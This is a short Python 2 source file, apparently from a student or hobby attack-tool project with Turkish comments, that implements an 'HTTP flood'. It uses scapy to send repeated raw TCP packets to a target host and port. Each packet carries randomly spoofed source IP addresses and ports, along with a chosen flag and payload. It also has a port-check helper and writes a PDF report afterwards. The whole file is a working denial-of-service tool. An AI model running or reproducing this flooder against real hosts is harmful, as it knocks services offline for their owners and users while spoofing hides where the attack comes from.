# -*- coding: utf-8 -*-

import random
from scapy.all import *
import socket
from createPDF import *


def SpoofIP():
	return "%s.%s.%s.%s" %(random.randint(1,255),random.randint(1, 255),random.randint(1, 255),random.randint(1, 255))

def SpoofPort():
	return random.randint(10000,65535)

def isAlive(dst,port):
	s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
	result = s.connect_ex((dst,int(port)) )
	if result == 0:
		print "{} {} is open".format(dst,port)
	else:
		print "{} {} is not open".format(dst,port)


class HTTPFlood():
	def __init__(self,dst,port,flag,payload,count):
		#View'den gelen degiskenlerin atamaları yapılıyor
		self.dst ,self.port , self.flag ,self.payload ,self.count = \
			dst ,port , flag ,payload, count

		if str(self.dst).startswith("http"):
			#[:-1] -> burada çoğu linkte olan / kaldırmak için kullandım
			tmp = str(self.dst).split("/")[2]
			self.dst = socket.gethostbyname(tmp)

	def Start(self):
		for i in range(int(self.count)):
			self.Attack()

		CreatePDF("Http Flood","80 is open")

		#isAlive fonksiyonu çalıştırılarak hedefin live olup olmadığı bilgisi dönüyor
		#isAlive(self.dst, self.port)

	def Attack(self):
		src_ip = SpoofIP()
		src_port = SpoofPort()
		network_layer = IP(src=src_ip, dst=self.dst)
		transport_layer = TCP(sport=int(src_port), dport=int(self.port), flags=str(self.flag))
		send(network_layer / transport_layer / Raw(load=self.payload), verbose=False)
